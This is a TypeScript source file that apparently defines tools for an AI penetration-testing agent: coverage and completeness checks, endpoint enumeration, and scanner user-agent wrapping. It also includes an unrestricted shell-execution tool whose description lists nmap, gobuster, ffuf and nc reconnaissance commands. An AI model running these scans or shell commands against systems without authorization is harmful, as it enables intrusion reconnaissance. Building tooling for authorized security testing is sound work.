      objective: z.string().optional().describe("The penetration testing objective to compare coverage against"),
      toolCallDescription: z.string()
    }),

    execute: async ({ objective }) => {
      try {
        const testResultsPath = join(session.scratchpadPath, 'test-results.jsonl');

        if (!existsSync(testResultsPath)) {
          return {
            success: true,
            totalTests: 0,
            coverage: {},
            message: "No test results recorded yet. Start testing with test_parameter tool.",
            suggestions: objective
              ? `Based on objective "${objective}", consider testing relevant parameters with test_parameter tool.`
              : "Use test_parameter to test parameters for vulnerabilities."
          };
        }

        // Read all test results
        const fileContent = readFileSync(testResultsPath, 'utf-8');
        const testResults = fileContent
          .trim()
          .split('\n')
          .filter(line => line.trim())
          .map(line => JSON.parse(line));

        // Analyze coverage
        const parametersTested = new Set<string>();
        const attackTypesCovered = new Set<string>();
        const endpointsTested = new Set<string>();
        const vulnerableTests = [];
        const safeTests = [];

        const coverageByAttackType: Record<string, {
          total: number;
          vulnerable: number;
          safe: number;
          parameters: Set<string>;
        }> = {};

        for (const result of testResults) {
          parametersTested.add(result.parameter);
          endpointsTested.add(result.endpoint);
          attackTypesCovered.add(result.attackType);

          if (!coverageByAttackType[result.attackType]) {
            coverageByAttackType[result.attackType] = {
              total: 0,
              vulnerable: 0,
              safe: 0,
              parameters: new Set()
            };
          }

          const coverage = coverageByAttackType[result.attackType]!;
          coverage.total++;
          coverage.parameters.add(result.parameter);

          if (result.vulnerable) {
            vulnerableTests.push(result);
            coverage.vulnerable++;
          } else {
            safeTests.push(result);
            coverage.safe++;
          }
        }

        // Format coverage summary
        const coverageSummary = Object.entries(coverageByAttackType).map(([attackType, stats]) => ({
          attackType,
          testsPerformed: stats.total,
          vulnerabilitiesFound: stats.vulnerable,
          parametersTested: Array.from(stats.parameters),
          parametersCount: stats.parameters.size
        }));

        // Identify gaps
        const allAttackTypes = Object.keys(ATTACK_KNOWLEDGE);
        const untestedAttackTypes = allAttackTypes.filter(at => !attackTypesCovered.has(at));

        // Generate suggestions
        const suggestions = [];

        if (objective) {
          const objectiveLower = objective.toLowerCase();

          // Check if objective mentions specific attack types that weren't tested
          for (const attackType of untestedAttackTypes) {
            const knowledge = ATTACK_KNOWLEDGE[attackType as keyof typeof ATTACK_KNOWLEDGE];
            // Skip methodology - it's not a testable attack type
            if ('systematic_discovery' in knowledge) continue;

            if (objectiveLower.includes(attackType.replace('_', ' ')) ||
                objectiveLower.includes(knowledge.name.toLowerCase())) {
              suggestions.push(`⚠️ Objective mentions "${knowledge.name}" but no tests performed yet`);
            }
          }
        }

        // Suggest testing parameters with different attack types
        if (parametersTested.size > 0 && attackTypesCovered.size < allAttackTypes.length) {
          const sampleParameter = Array.from(parametersTested)[0];
          const untestedForParam = untestedAttackTypes.slice(0, 3);
          if (untestedForParam.length > 0) {
            suggestions.push(`Consider testing "${sampleParameter}" for: ${untestedForParam.join(', ')}`);
          }
        }

        // Suggest thoroughness improvements
        if (testResults.length < 5) {
          suggestions.push("Coverage is low. Consider testing more parameters and attack types.");
        }

        return {
          success: true,
          totalTests: testResults.length,
          parametersTested: Array.from(parametersTested),
          parametersCount: parametersTested.size,
          endpointsTested: Array.from(endpointsTested),
          endpointsCount: endpointsTested.size,
          attackTypesCovered: Array.from(attackTypesCovered),
          attackTypesCount: attackTypesCovered.size,
          untestedAttackTypes,
          vulnerableCount: vulnerableTests.length,
          safeCount: safeTests.length,
          coverageByAttackType: coverageSummary,
          vulnerabilities: vulnerableTests.map(v => ({
            parameter: v.parameter,
            endpoint: v.endpoint,
            attackType: v.attackType,
            confidence: v.confidence
          })),
          suggestions: suggestions.length > 0 ? suggestions : ["Coverage looks good. Review findings and prepare report."],
          message: `Analyzed ${testResults.length} tests across ${parametersTested.size} parameters and ${attackTypesCovered.size} attack types.`
        };

      } catch (error: any) {
        return {
          success: false,
          error: error.message,
          message: `Failed to analyze coverage: ${error.message}`
        };
      }
    }
  });
}

/**
 * Validate completeness before final reporting
 * Ensures agent tested everything systematically
 */
function createValidateCompletenessTool(session: Session) {
  return tool({
    name: "validate_completeness",
    description: `Validate that you've completed a thorough, professional assessment before generating final report.

This tool checks:
- Did you discover the complete attack surface?
- Did you test all discovered endpoints/parameters?
- Did you investigate all anomalies?
- Is your coverage > 90%?

Use this BEFORE calling generate_report to ensure completeness.

This is the difference between amateur and professional pentesting.`,

    inputSchema: z.object({
      objective: z.string().describe("Original penetration testing objective"),
      discoveryAttempts: z.number().describe("How many times did you try to discover new endpoints?"),
      anomaliesInvestigated: z.array(z.string()).describe("List of anomalies (404/500/errors) you investigated"),
      toolCallDescription: z.string()
    }),

    execute: async ({ objective, discoveryAttempts, anomaliesInvestigated }) => {
      try {
        const coverageTool = createCheckTestingCoverageTool(session);
        const coverageResult: any = await (coverageTool.execute as any)({
          objective,
          toolCallDescription: 'Checking coverage for validation'
        });

        if (!coverageResult.success) {
          return {
            success: false,
            message: "Cannot validate completeness - coverage check failed",
            error: coverageResult.error
          };
        }

        const issues = [];
        const warnings = [];
        const passes = [];

        if (discoveryAttempts < 3) {
          issues.push(`⚠️ Only ${discoveryAttempts} discovery attempts - need at least 3 to ensure completeness`);
        } else {
          passes.push(`✓ Made ${discoveryAttempts} discovery attempts - likely found everything`);
        }

        const totalTests = coverageResult.totalTests || 0;
        const parametersCount = coverageResult.parametersCount || 0;
        const endpointsCount = coverageResult.endpointsCount || 0;

        if (totalTests < 5) {
          issues.push(`⚠️ Only ${totalTests} tests performed - likely insufficient coverage`);
        } else {
          passes.push(`✓ Performed ${totalTests} tests across ${parametersCount} parameters and ${endpointsCount} endpoints`);
        }

        // Check 3: Attack type diversity
        const attackTypesCount = coverageResult.attackTypesCount || 0;
        if (attackTypesCount < 3) {
          warnings.push(`⚠️ Only tested ${attackTypesCount} attack types - consider broader coverage`);
        } else {
          passes.push(`✓ Tested ${attackTypesCount} different attack types`);
        }

        // Check 4: Anomaly investigation
        if (anomaliesInvestigated.length === 0) {
          warnings.push("⚠️ No anomalies investigated - did you encounter no errors at all?");
        } else {
          passes.push(`✓ Investigated ${anomaliesInvestigated.length} anomalies/errors`);
        }

        // Check 5: Findings documented
        const vulnerableCount = coverageResult.vulnerableCount || 0;
        if (vulnerableCount === 0 && totalTests > 10) {
          warnings.push("⚠️ No vulnerabilities found despite extensive testing - verify test payloads are working");
        } else if (vulnerableCount > 0) {
          passes.push(`✓ Found ${vulnerableCount} vulnerabilities`);
        }

        // Check 6: Objective alignment
        if (objective && coverageResult.suggestions) {
          const hasObjectiveWarnings = coverageResult.suggestions.some((s: string) => s.includes('Objective mentions'));
          if (hasObjectiveWarnings) {
            issues.push("⚠️ Objective mentions attack types that weren't tested - see coverage suggestions");
          } else {
            passes.push("✓ Testing aligns with objective");
          }
        }

        // Calculate completeness score
        const totalChecks = 6;
        const passedChecks = passes.length;
        const completenessScore = Math.round((passedChecks / totalChecks) * 100);

        // Determine if ready to report
        const isComplete = issues.length === 0 && completenessScore >= 70;
        const isReady = issues.length === 0 && completenessScore >= 90;

        return {
          success: true,
          completenessScore,
          isComplete,
          isReady,
          passes,
          warnings,
          issues,
          recommendation: isReady
            ? "✅ Assessment is complete and thorough. Ready to generate_report."
            : isComplete
              ? "⚠️ Assessment is acceptable but could be more thorough. Consider addressing warnings before generate_report."
              : "❌ Assessment is incomplete. Address issues before generate_report.",
          nextActions: issues.length > 0
            ? issues.map(issue => issue.replace('⚠️ ', 'TODO: '))
            : warnings.length > 0
              ? warnings.map(warn => warn.replace('⚠️ ', 'Consider: '))
              : ["Generate final report"],
          coverageDetails: {
            totalTests,
            parametersCount,
            endpointsCount,
            attackTypesCount,
            vulnerableCount,
            safeCount: coverageResult.safeCount || 0
          }
        };

      } catch (error: any) {
        return {
          success: false,
          error: error.message,
          message: `Validation failed: ${error.message}`
        };
      }
    }
  });
}

/**
 * Quick endpoint enumeration helper
 * Wraps execute_command for common enumeration patterns
 */
function createEnumerateEndpointsTool(session: Session) {
  return tool({
    name: "enumerate_endpoints",
    description: `Quickly enumerate endpoints using pattern-based discovery.

Use this when:
- You discover numbered endpoints (/xss1, /xss2, etc.)
- Testing admin panels with multiple actions
- API versioning (v1, v2, v3)
- Any pattern-based endpoint structure

This tool is faster than manual curl loops and automatically records results.`,

    inputSchema: z.object({
      baseUrl: z.string().describe("Base URL (e.g., http://target.com)"),
      pattern: z.string().describe("Pattern with {n} placeholder (e.g., /xss{n}, /api/v{n})"),
      range: z.object({
        min: z.number().default(1),
        max: z.number().default(100)
      }).describe("Range to enumerate"),
      methods: z.array(z.enum(['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])).default(['GET']).describe("HTTP methods to test"),
      toolCallDescription: z.string()
    }),

    execute: async ({ baseUrl, pattern, range, methods }) => {
      const discovered = [];

      console.log(`\n[*] Enumerating ${baseUrl}${pattern} from ${range.min} to ${range.max}...`);

      // Generate bash script for enumeration
      for (let i = range.min; i <= range.max; i++) {
        const endpoint = `${baseUrl}${pattern.replace('{n}', i.toString())}`;

        for (const method of methods) {
          try {
            const response = await fetch(endpoint, {
              method,
              redirect: 'manual'
            });

            if (response.status !== 404) {
              discovered.push({
                endpoint,
                method,
                status: response.status
              });
              console.log(`  Found: ${endpoint} [${method}] → HTTP ${response.status}`);
            }
          } catch (error) {
            // Network errors, ignore
          }
        }
      }

      // Record discovery in scratchpad
      const note = `Endpoint Enumeration Results for ${pattern}:
Found ${discovered.length} endpoints:
${discovered.map(d => `- ${d.endpoint} [${d.method}] → HTTP ${d.status}`).join('\n')}

Not found: ${(range.max - range.min + 1 - discovered.length)} endpoints returned 404`;

      // Record in scratchpad directly
      try {
        const timestamp = new Date().toISOString();
        const scratchpadFile = join(session.scratchpadPath, "notes.md");
        const entry = `## RESULT - ${timestamp}\n\n${note}\n\n---\n\n`;

        try {
          appendFileSync(scratchpadFile, entry);
        } catch (e) {
          const header = `# Scratchpad - Session ${session.id}\n\n**Target:** ${session.target}  \n**Objective:** ${session.objective}\n\n---\n\n`;
          writeFileSync(scratchpadFile, header + entry);
        }
      } catch (err) {
        console.error('Failed to record to scratchpad:', err);
      }

      return {
        success: true,
        discovered,
        total: range.max - range.min + 1,
        foundCount: discovered.length,
        notFoundCount: (range.max - range.min + 1) - discovered.length,
        message: `Found ${discovered.length}/${range.max - range.min + 1} endpoints`,
        nextAction: discovered.length > 0
          ? `Test each discovered endpoint for vulnerabilities`
          : `Pattern ${pattern} not found - try different pattern`
      };
    }
  });
}

/**
 * Wraps commands with User-Agent headers for common pentesting tools
 */
function wrapCommandWithHeaders(command: string, headers: Record<string, string>): string {
  const userAgent = headers['User-Agent'];
  if (!userAgent) return command;

  // Apply wrappers (defensive - won't break if pattern doesn't match)
  let wrapped = command;

  // curl - add User-Agent if not already present
  if (command.includes('curl') && !command.includes('User-Agent') && !command.includes('-A')) {
    // Use global replace to handle multiple curl commands in one line
    wrapped = wrapped.replace(/\bcurl(\s+)/g, `curl -A "${userAgent}" $1`);
  }

  // nikto - add User-Agent if not already present
  if (command.includes('nikto') && !command.includes('-useragent')) {
    wrapped = wrapped.replace(/\bnikto\s+/, `nikto -useragent "${userAgent}" `);
  }

  // nmap - add User-Agent for HTTP scripts only
  if (command.includes('nmap') && command.includes('--script') &&
      /--script[= ](.*?http.*?)/.test(command) && !command.includes('http.useragent')) {
    if (command.includes('--script-args')) {
      wrapped = wrapped.replace(/--script-args\s+([^\s]+)/, `--script-args $1,http.useragent="${userAgent}"`);
    } else {
      wrapped = `${wrapped} --script-args http.useragent="${userAgent}"`;
    }
  }

  // gobuster - add User-Agent if not already present
  if (command.includes('gobuster') && !command.includes('-a ') && !command.includes('--useragent')) {
    wrapped = wrapped.replace(/\bgobuster\s+/, `gobuster -a "${userAgent}" `);
  }

  // ffuf - add User-Agent if not already present
  if (command.includes('ffuf') && !command.includes('User-Agent:')) {
    wrapped = wrapped.replace(/\bffuf\s+/, `ffuf -H "User-Agent: ${userAgent}" `);
  }

  // sqlmap - add User-Agent if not already present
  if (command.includes('sqlmap') && !command.includes('--user-agent')) {
    wrapped = wrapped.replace(/\bsqlmap\s+/, `sqlmap --user-agent="${userAgent}" `);
  }

  // wfuzz - add User-Agent if not already present
  if (command.includes('wfuzz') && !command.includes('-H') && !command.includes('User-Agent')) {
    wrapped = wrapped.replace(/\bwfuzz\s+/, `wfuzz -H "User-Agent: ${userAgent}" `);
  }

  // dirb - add User-Agent if not already present
  if (command.includes('dirb') && !command.includes('-a')) {
    wrapped = wrapped.replace(/\bdirb\s+/, `dirb -a "${userAgent}" `);
  }

  // wpscan - add User-Agent if not already present
  if (command.includes('wpscan') && !command.includes('--user-agent')) {
    wrapped = wrapped.replace(/\bwpscan\s+/, `wpscan --user-agent "${userAgent}" `);
  }

  // nuclei - add User-Agent if not already present
  if (command.includes('nuclei') && !command.includes('-H')) {
    wrapped = wrapped.replace(/\bnuclei\s+/, `nuclei -H "User-Agent: ${userAgent}" `);
  }

  // httpx - add User-Agent if not already present
  if (command.includes('httpx') && !command.includes('-H')) {
    wrapped = wrapped.replace(/\bhttpx\s+/, `httpx -H "User-Agent: ${userAgent}" `);
  }

  return wrapped;
}

// Export tools creator function that accepts a session
export function createPentestTools(
  session: Session,
  model?: AIModel,
  toolOverride?: {
    execute_command?: (
      opts: ExecuteCommandOpts
    ) => Promise<ExecuteCommandResult>;
    http_request?: (opts: HttpRequestOpts) => Promise<HttpRequestResult>;
  }
) {
  // Get offensive headers from session config
  const offensiveHeaders = getOffensiveHeaders(session);

  // Get rate limiter from session (initialized eagerly in createSession)
  const rateLimiter = session._rateLimiter;

  const executeCommand = tool({
    name: "execute_command",
    description: `Execute a shell command for penetration testing activities.

COMMON COMMANDS FOR BLACK BOX TESTING:

RECONNAISSANCE:
- nmap -sV -sC <target>              # Service version detection + default scripts
- nmap -p- <target>                  # Scan all ports
- nmap -sU <target>                  # UDP scan
- nmap -A <target>                   # Aggressive scan (OS, version, scripts)
- dig <domain>                       # DNS lookup
- whois <domain>                     # Domain registration info
- host <domain>                      # DNS hostname lookup

WEB APPLICATION TESTING:
- curl -i <url>                      # HTTP request with headers
- curl -X POST -d "data" <url>       # POST request
- curl -H "Header: value" <url>      # Custom headers
- curl -L <url>                      # Follow redirects
- curl -k <url>                      # Ignore SSL errors
- nikto -h <host>                    # Web server scanner
- gobuster dir -u <url> -w <wordlist> # Directory enumeration
- gobuster dns -d <domain> -w <wordlist> # Subdomain enumeration
- ffuf -u <url>/FUZZ -w <wordlist>   # Web fuzzer

SSL/TLS TESTING:
- openssl s_client -connect <host>:<port> # SSL/TLS connection test
- nmap --script ssl-enum-ciphers -p 443 <host> # SSL cipher enumeration

NETWORK ANALYSIS:
- nc -zv <host> <port>               # Port connection test
- traceroute <host>                  # Network path tracing
- ping -c 4 <host>                   # ICMP connectivity test

OUTPUT HANDLING:
- Use 2>&1 to capture stderr
- Use timeout command for long-running scans
- Consider -oN for nmap output

IMPORTANT: Always analyze results and adjust your approach based on findings.`,
    inputSchema: ExecuteCommandInput,
    execute: async ({ command, timeout = 30000, toolCallDescription }) => {
      try {
        // Apply rate limiting before command execution
        if (rateLimiter) {
          await rateLimiter.acquireSlot();
        }

        if (toolOverride?.execute_command) {
          return toolOverride.execute_command({
            command,
            timeout,
            toolCallDescription,
          });
        }

        // Wrap command with User-Agent headers if offensive headers are configured
        const finalCommand = offensiveHeaders
          ? wrapCommandWithHeaders(command, offensiveHeaders)
          : command;

        const { stdout, stderr } = await execAsync(finalCommand, {
          timeout,
          maxBuffer: 10 * 1024 * 1024, // 10MB buffer
        });
        return {
          success: true,
          stdout:
            `${stdout.substring(
              0,
              50000
            )}... \n\n (truncated) call the command again with grep / tail to paginate the response` ||
            "(no output)",
          stderr: stderr || "",
          command: finalCommand,
          error: "",
        };
      } catch (error: any) {
        return {
          success: false,
          error: error.message,
          stdout: error.stdout || "",
          stderr: error.stderr || "",
          command,
        };
      }
    },
  });

  // Define httpRequest tool with override support
  const httpRequest = tool({
    name: "http_request",
    description: `Make HTTP requests with detailed response analysis for web application testing.

USAGE GUIDANCE:
- Always check response headers for security misconfigurations
- Look for: X-Frame-Options, X-XSS-Protection, CSP, HSTS, X-Content-Type-Options
- Analyze cookies for HttpOnly, Secure, SameSite flags
- Check for verbose error messages that leak information
- Test for common web vulnerabilities (SQL injection, XSS, IDOR)
- Monitor response times for blind injection attacks
- Test different HTTP methods (GET, POST, PUT, DELETE, PATCH, OPTIONS)
- Examine redirects and authentication flows

COMMON TESTING PATTERNS:
- Test with/without authentication
- Try different user agents
- Test for CORS misconfigurations
- Check for API endpoints (/api/, /v1/, /graphql)
- Look for admin panels (/admin, /administrator, /wp-admin)
- Test for backup files (.bak, .old, ~, .swp)`,
    inputSchema: HttpRequestInput,
    execute: async ({ url, method, headers, body, followRedirects, timeout, toolCallDescription }) => {
      try {
        // Apply rate limiting before HTTP request
        if (rateLimiter) {
          await rateLimiter.acquireSlot();
        }

        if (toolOverride?.http_request) {
          return toolOverride.http_request({
            url,
            method,
            headers,
            body,
            followRedirects,
            timeout,
            toolCallDescription,
          });
        }

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), timeout);

        const response = await fetch(url, {
          method,
          headers: {
            ...(offensiveHeaders || {}),  // Custom headers from session config
            ...(headers || {}),            // User headers can override
          },
          body: body || undefined,
          redirect: followRedirects ? "follow" : "manual",
          signal: controller.signal,
        });

        clearTimeout(timeoutId);

        const responseHeaders: Record<string, string> = {};
        response.headers.forEach((value, key) => {
          responseHeaders[key] = value;
        });

        let responseBody = "";
        try {
          responseBody = await response.text();
        } catch (e) {
          responseBody = "(unable to read response body)";
        }

        return {
          success: true,
          status: response.status,
          statusText: response.statusText,
          headers: responseHeaders,
          body: `${responseBody.substring(
            0,
            5000
          )}... \n\n (truncated) use execute_command with grep / tail to paginate the response`,
          url: response.url,
          redirected: response.redirected,
        };
      } catch (error: any) {
        return {
          success: false,
          error: error.message,
          url,
          method,
          status: 0,
          statusText: "",
          headers: {},
          body: "",
          redirected: false,
        };
      }
    },
  });

  return {
    execute_command: executeCommand,
    http_request: httpRequest,
    document_finding: createDocumentFindingTool(session),
    record_test_result: createRecordTestResultTool(session),
    test_parameter: createSmartTestTool(session, model || 'claude-sonnet-4-20250514'),
    check_testing_coverage: createCheckTestingCoverageTool(session),
    validate_completeness: createValidateCompletenessTool(session),
    enumerate_endpoints: createEnumerateEndpointsTool(session),
    analyze_scan: analyzeScan,
    scratchpad: createScratchpadTool(session),
    generate_report: createGenerateReportTool(session),
    get_attack_surface: getAttackSurfaceAgent(),
    pentest_agents: runPentestAgents(model),
  };
}
